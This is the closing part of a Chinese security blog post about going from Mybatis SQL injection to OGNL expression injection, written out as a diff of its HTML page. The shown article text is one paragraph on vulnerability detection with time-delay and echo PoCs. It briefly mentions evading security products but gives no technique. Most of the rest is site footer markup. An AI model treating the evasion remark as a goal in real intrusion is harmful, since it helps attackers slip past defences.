+<p><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/SQLI_OGNL/27.png" alt=""></p>
+<p>当然，如果要实现比较理想的检出效果（高检出率和低误报率），肯定不仅仅是直接发一个时间延迟的Poc请求然后直接看响应的延迟，或者就直接发一个构造回显的请求，更多的还要综合考虑网络本身的延迟、Poc的依赖条件等因素的影响，以及如何尽量躲避安全产品的检测防护。</p>
+<p>参考资料：<br><a href="https://forum.butian.net/share/1749" target="_blank" rel="noopener">https://forum.butian.net/share/1749</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x1-前言"><span class="toc-number">1.</span> <span class="toc-text">0x1 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-漏洞利用"><span class="toc-number">2.</span> <span class="toc-text">0x2 漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-漏洞原理"><span class="toc-number">3.</span> <span class="toc-text">0x3 漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x4-思考"><span class="toc-number">4.</span> <span class="toc-text">0x4 思考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://changxia3.com/2024/01/09/%E6%B8%97%E9%80%8F%E5%9B%9E%E5%BF%86%E5%BD%95%EF%BD%9CMybatis%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://changxia3.com/2024/01/09/%E6%B8%97%E9%80%8F%E5%9B%9E%E5%BF%86%E5%BD%95%EF%BD%9CMybatis%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&text=渗透回忆录｜Mybatis从SQL注入到OGNL表达式注入" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://changxia3.com/2024/01/09/%E6%B8%97%E9%80%8F%E5%9B%9E%E5%BF%86%E5%BD%95%EF%BD%9CMybatis%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&title=渗透回忆录｜Mybatis从SQL注入到OGNL表达式注入" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://changxia3.com/2024/01/09/%E6%B8%97%E9%80%8F%E5%9B%9E%E5%BF%86%E5%BD%95%EF%BD%9CMybatis%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&is_video=false&description=渗透回忆录｜Mybatis从SQL注入到OGNL表达式注入" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=渗透回忆录｜Mybatis从SQL注入到OGNL表达式注入&body=Check out this article: http://changxia3.com/2024/01/09/%E6%B8%97%E9%80%8F%E5%9B%9E%E5%BF%86%E5%BD%95%EF%BD%9CMybatis%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://changxia3.com/2024/01/09/%E6%B8%97%E9%80%8F%E5%9B%9E%E5%BF%86%E5%BD%95%EF%BD%9CMybatis%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&title=渗透回忆录｜Mybatis从SQL注入到OGNL表达式注入" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://changxia3.com/2024/01/09/%E6%B8%97%E9%80%8F%E5%9B%9E%E5%BF%86%E5%BD%95%EF%BD%9CMybatis%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&title=渗透回忆录｜Mybatis从SQL注入到OGNL表达式注入" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://changxia3.com/2024/01/09/%E6%B8%97%E9%80%8F%E5%9B%9E%E5%BF%86%E5%BD%95%EF%BD%9CMybatis%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&title=渗透回忆录｜Mybatis从SQL注入到OGNL表达式注入" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://changxia3.com/2024/01/09/%E6%B8%97%E9%80%8F%E5%9B%9E%E5%BF%86%E5%BD%95%EF%BD%9CMybatis%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&title=渗透回忆录｜Mybatis从SQL注入到OGNL表达式注入" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://changxia3.com/2024/01/09/%E6%B8%97%E9%80%8F%E5%9B%9E%E5%BF%86%E5%BD%95%EF%BD%9CMybatis%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&name=渗透回忆录｜Mybatis从SQL注入到OGNL表达式注入&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://changxia3.com/2024/01/09/%E6%B8%97%E9%80%8F%E5%9B%9E%E5%BF%86%E5%BD%95%EF%BD%9CMybatis%E4%BB%8ESQL%E6%B3%A8%E5%85%A5%E5%88%B0OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/&t=渗透回忆录｜Mybatis从SQL注入到OGNL表达式注入" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2024
+    长夏
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
